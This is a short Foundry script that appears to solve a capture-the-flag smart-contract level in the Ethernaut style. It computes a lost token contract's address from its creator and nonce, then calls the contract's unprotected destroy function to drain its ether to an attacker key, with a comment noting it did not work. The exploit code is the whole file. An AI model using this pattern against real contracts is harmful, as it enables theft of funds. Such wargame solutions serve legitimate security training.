// SPDX-License-Identifier: MIT

pragma solidity ^0.8.17;

import "forge-std/Script.sol";

interface ISimpleToken {
    function destroy(address) external;
}

// Did not work
contract RecoveryScript is Script {
    function run() external {
        address attacker = vm.rememberKey(vm.envUint("TESTNET_PRIVATE_KEY_2"));
        address recoveryAddr = vm.envAddress("RECOVERY_ADDRESS");

        // https://ethereum.stackexchange.com/questions/760/how-is-the-address-of-an-ethereum-contract-computed
        address simpleTokenAddr = address(
            uint160(
                uint256(
                    keccak256(
                        abi.encodePacked(
                            bytes1(0xd6),
                            bytes1(0x94),
                            recoveryAddr,
                            bytes1(0x01)
                        )
                    )
                )
            )
        );

        console2.log("Computed address : ", simpleTokenAddr);

        assert(simpleTokenAddr.balance > 0);

        console2.log(
            "SimpleToken balance before hack :",
            simpleTokenAddr.balance
        );

        vm.startBroadcast(attacker);
        ISimpleToken(simpleTokenAddr).destroy(attacker);
        vm.stopBroadcast();

        console2.log(
            "SimpleToken balance after hack :",
            simpleTokenAddr.balance
        );
        console2.log("SUCCESS!!! Submit the instance.");
    }
}
